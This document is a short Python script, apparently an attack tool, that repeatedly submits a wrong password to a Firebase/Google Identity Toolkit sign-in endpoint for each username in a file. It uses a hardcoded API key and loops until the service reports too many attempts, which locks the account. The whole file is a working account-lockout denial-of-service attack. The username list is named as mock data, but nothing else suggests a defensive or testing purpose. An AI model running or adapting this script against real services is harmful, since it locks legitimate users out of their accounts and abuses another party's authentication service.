import httpx

def attack_account(username):
    url = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyBi1SphhzJG0C17iJMOdPEEj2Vxu0F4ESU"

    payload = {
        "email": username,
        "password": "Lockout1*"
    }
    
    while True:
        response = httpx.post(url, json=payload)
        data = response.json()

        if "error" in data:
            if data["error"]["message"] == "INVALID_LOGIN_CREDENTIALS":
                print(f"failed to login {username}")
            elif data["error"]["message"] == "TOO_MANY_ATTEMPTS_TRY_LATER":
                print(f"attack worked on {username}")
                return 0
        else:
            print("Login successful")
        
def master():
    while True:
        with open("./attack/mock_usernames.txt" , "r") as f:
            for username in f:
                try:
                    attack_account(username)
                    print(f"successfully attacked {username}")
                except Exception as e:
                    print(f"{e}: failed to attack {username}")
                    
                
                
                
if __name__ == "__main__":
    master()